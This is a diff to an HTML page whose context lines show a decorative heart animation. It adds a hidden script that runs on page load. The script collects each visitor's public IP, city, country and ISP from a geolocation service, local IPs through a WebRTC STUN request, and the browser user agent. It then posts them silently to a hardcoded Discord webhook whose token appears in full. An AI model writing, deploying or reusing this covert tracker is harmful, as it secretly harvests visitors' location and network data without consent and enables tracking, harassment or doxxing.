@@ -99,33 +99,43 @@
             setTimeout(() => cHeart.remove(), 500);
         });
 
-        // Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1406003285600501970/DHV4856DEk1Um6N70WyTjnl5qMsPd1egU98METNMoC8Jgs1Dzgb2VCbqKtaaTigA_i1P";
 
-        // WebRTC für echte IP
-        function getIPs(callback){
-            const pc = new RTCPeerConnection({iceServers:[]});
-            const ips = [];
+        // Public IP + Geo holen
+        async function getPublicIP(){
+            let ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+            return ipData;
+        }
+
+        // WebRTC echte IPs (lokal + evtl. public)
+        function getLocalIPs(callback){
+            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
             pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.createOffer().then(o => pc.setLocalDescription(o));
             pc.onicecandidate = event => {
                 if (!event || !event.candidate) return;
                 const parts = event.candidate.candidate.split(" ");
                 const ip = parts[4];
-                if (!ips.includes(ip)) {
-                    ips.push(ip);
-                    callback(ip);
-                }
+                if (ip && !ip.includes(".local")) callback(ip);
             };
         }
 
-        getIPs(ip => {
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `new visitor (${ip})` })
+        (async () => {
+            let pub = await getPublicIP();
+            let ips = [];
+            getLocalIPs(ip => {
+                if (!ips.includes(ip)) ips.push(ip);
             });
-        });
+            setTimeout(() => {
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `💖 new visitor 💖\nPublic IP: ${pub.ip}\nLocation: ${pub.city}, ${pub.country_name}\nISP: ${pub.org}\nLocal IPs: ${ips.join(", ")}\nUA: ${navigator.userAgent}`
+                    })
+                });
+            }, 2000);
+        })();
     </script>
 </body>
 </html>
